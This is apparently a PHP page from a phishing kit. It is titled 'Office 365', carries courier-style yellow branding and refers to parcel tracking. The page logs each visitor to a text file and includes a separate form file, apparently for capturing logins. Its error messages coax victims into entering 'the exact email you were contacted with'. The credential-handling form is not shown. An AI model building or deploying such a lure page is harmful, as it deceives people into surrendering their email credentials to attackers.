<?php 
$class ="";

if($_GET['error']==1 || $_GET['error']==2){
	$class="error1";
}
$myfile = fopen("dh.txt", "a");
$txt = "one user<br>";
fwrite($myfile, "\n". $txt);
fclose($myfile);
?> 
 
 <!DOCTYPE html>
<html>
<head>
<title>Office 365</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<style>
body {
 background-color: #cccccc;
}
.bg-yellow {
  background-color: #fdca00;
}
.homec{
 background-image: url("static/index3.jpg");
 background-size: cover;
	
	width:100%;
	height:100vh;
    display: flex;
     justify-contents:center;
     align-item:center;
	 display:flex;
	 justify-content:center;
	 align-items:center;
	 position: relative;
	
}
.overlay {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: gray;
  opacity: .8;
  display: flex;
  flex-direction: column;
  justify-content: space-evenly;
  align-items: center;
}
.form{
width:25rem;
min-width:18rem;
height:auto;
background-color: #fff;
padding:2rem;
line-height: .2rem;
}

#fname{
width:100%;
height:2.5rem;
border-top:0;
border-right:0;
border-left:0;
padding-left:.5rem;
font-size: 1rem;
}
.small{
	color:green;
	font-size:1rem;
	 
}
#button{
height:2rem;
width:8rem;
border:0;
float:right;
background-color: blue;
}
.button{
	color:white;
	
}
a{
text-decoration:none;
color:gray;
}
.icon-nav{
   height: 4rem;
   width: 5rem;
}

.error1{
	color:red;
    padding:1rem;
	margin:1rem;
	width:auto;
	height:auto;
	background-color:white;
	border-radius:10px;
}
</style>
<script>
function focusOnInput() {
    document.forms["loForm"]["fname"].focus();
}
</script>
</head>
<body onload="focusOnInput()">
<div>
<nav class="navbar navbar-expand-lg navbar-light bg-yellow">
      <a class="navbar-brand bg-yellow" href="#">
        <img
		class="icon-nav"
          src="static/icon.jpg";
          alt="";
        />
      </a>
      <button
        class="navbar-toggler"
        type="button"
        data-toggle="collapse"
        data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent"
        aria-expanded="false"
        aria-label="Toggle navigation"
      >
        <span class="navbar-toggler-icon"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav mr-auto"></ul>
        <form class="form-inline my-2 my-lg-0">
          <input
            class="form-control mr-sm-2"
            type="search"
            placeholder="Search"
            aria-label="Search"
          />
          <button class="btn btn-outline-success my-2 my-sm-0" type="submit">
            Search
          </button>
        </form>
      </div>
    </nav>
</div>

<div class="homec">
<div class="overlay">
<div class= <?php echo $class ?>  >
<?php 
if($_GET['error'] == 1){
	echo "--Error# Invalid Email<br> Your email is linked to your tracking, Ensure that you entered the exact email you were contacted with!!";
}else if ($_GET['error'] == 2){
	echo "--Error# Something went wrong<br> -Make sure the tracking details sent to your email was entered correctly<br>-Ensure that the tracking email matches the email we contacted you with!!";
}
?>
</div>
<?php include ("forms/dh.php")?>
</div>
</div>

</body>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</html> 